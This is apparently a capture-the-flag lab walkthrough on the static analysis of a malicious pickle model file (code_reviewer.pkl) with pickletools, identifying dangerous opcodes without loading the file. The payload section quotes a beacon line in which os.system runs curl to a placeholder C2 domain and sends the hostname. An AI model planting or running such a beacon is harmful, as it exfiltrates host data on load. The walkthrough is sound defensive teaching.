# Walkthrough — Investigating a Malicious Model (Task 3)

> Safely analyze a malicious pickle model (`code_reviewer.pkl`) without executing it.
>
> **Note:** flags and instance-specific values (e.g., the beacon C2 domain, read from the VM) are redacted per THM policy. Documents method.

## Objective

Determine whether a `.pkl` model is malicious and identify the embedded payload — **without ever loading it**.

## Method

1. **Check size/type.** Both malicious and clean files show a generic "data" type — inconclusive on its own.
2. **Disassemble safely.**
   ```bash
   python3 -m pickletools code_reviewer.pkl
   ```
   `pickletools` reads the opcode stream **without executing** it. Never `pickle.load()` / `torch.load()` an untrusted file.
3. **Spot the red-flag opcodes:**
   - `SHORT_BINUNICODE 'os'` and `'system'` — pulling in system command execution.
   - `STACK_GLOBAL` — resolving a global (the function to call).
   - a `curl`/beacon string — outbound C2.
   - **`REDUCE`** — the opcode that actually executes the resolved callable.
4. **Compare to the clean model.** The benign file resolves a harmless class; the malicious one wires `os.system(...)` to a beacon.
5. Optional helper `safe_analysis.py` produces a verdict.

## What the payload does

A beacon of the shape `os.system("curl http://<c2-domain>/beacon?host=$(hostname)")` — exfiltrating host identity on load. (The exact domain is instance-specific and omitted.)

## Techniques / concepts applied
Static pickle analysis (`pickletools`) · opcode red-flag identification (`REDUCE`, `STACK_GLOBAL`) · clean-vs-malicious diffing · safe handling of untrusted serialised models.
